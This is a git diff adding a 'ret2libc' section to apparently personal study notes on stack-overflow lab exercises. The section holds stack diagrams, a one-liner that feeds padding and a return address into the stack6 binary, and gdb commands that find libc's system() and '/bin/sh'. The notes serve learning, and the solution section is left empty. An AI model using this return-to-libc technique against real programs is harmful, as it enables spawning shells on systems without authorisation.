@@ -16,7 +16,9 @@
     - [stack4 solution](#stack4-solution)
   - [stack5: jmp esp](#stack5-jmp-esp)
     - [stack5 solution](#stack5-solution)
-  - [stack6](#stack6)
+  - [stack6: ret2libc](#stack6-ret2libc)
+    - [ret2Libc Summary](#ret2libc-summary)
+    - [stack6 solution](#stack6-solution)
 
 ## stack0
 
@@ -203,4 +205,66 @@ r <<< $(python3 -c "print('A' * 76 )"|xargs echo -en;echo -en '\xf4\x83\x04\x08'
 
 - A problem: to `jmp esp`, `ebp` must be overwritten (modern system stack cookie)
 
-## stack6
+## stack6: ret2libc
+
+- img:
+  ![ret2Libc_visual](./img/ret2Libc_visual.jpg)
+  ref:(<https://bufferoverflows.net/ret2libc-exploitation-example/>)
+
+- info `ret2libc`
+
+- a conventional call?: push the param, push rtn address then jmp. (callee push ebp...)
+
+```asm
+  0x08048415 <+13>:    mov    DWORD PTR [esp],eax
+  0x08048418 <+16>:    call   0x804830c <gets@plt>
+```
+
+- stack before a normal `call` `jmp`
+
+```asm
+  0x00000000
+  ...
+  <param>
+  <returnAddressAfterTheCall>
+  <callee>
+  ...
+  0xffffffff
+```
+
+### ret2Libc Summary
+
+- Overwrite the `<callee>` address, and pretend to be a normal call. Basic structure:
+
+```sh
+  # payload = padding + libc_func_addr + ret_addr(could be used to chain exec) + func_param0 + func_param1
+./stack6 <<< $(python3 -c "print('A' * 64)"|xargs echo -en;echo -en '\x24\x84\x04\x08')
+```
+
+- find the `<callee>` function, from lib_c
+
+```gdb
+b *main + 62
+r
+info proc mappings
+p system
+  # $1 = {int (const char *)} 0x7ffff7e12410 <__libc_system>
+x/s 0x7ffff7e12410
+p /a 0x7ffff7e12410
+  # print as address
+
+```
+
+- find the `<param>` string in lib_c, e.g. `"/bin/sh"`
+
+```gdb
+find 0x7ffff7dbd000, 0x7fffffffffff, "/bin/sh"
+  # 0x7ffff7f745aa
+  #!? p /s 0x7ffff7f745aa
+x/s 0x7ffff7f745aa
+  # "/bin/sh"
+```
+
+- parse the payload
+
+### stack6 solution
